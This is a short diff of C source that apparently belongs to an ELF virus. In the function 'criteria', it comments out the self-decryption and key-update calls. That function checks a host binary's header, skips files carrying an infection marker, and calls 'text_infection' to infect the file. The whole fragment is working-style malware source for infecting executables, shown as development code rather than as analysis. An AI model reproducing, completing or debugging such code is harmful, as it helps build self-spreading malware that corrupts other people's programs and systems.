@@ -6,7 +6,7 @@
 
 void criteria(struct s_host *host, struct s_keychain *keychain)
 {
-	decrypt_left(keychain, (char *)&host_constructor, (void *)&criteria - (void *)&host_constructor);
+//	decrypt_left(keychain, (char *)&host_constructor, (void *)&criteria - (void *)&host_constructor);
 
 	if (host->filesize < sizeof(Elf64_Ehdr))
 		goto label_error;
@@ -21,8 +21,8 @@ void criteria(struct s_host *host, struct s_keychain *keychain)
 	if (*(unsigned int *)((char *)&host->header->e_ident[EI_PAD]) == INFECTED_MAGIC_NUMBER)
 		goto label_error;
 
-	update_keychain_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
-	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+//	update_keychain_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
+//	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
 
 	text_infection(host, keychain);
 
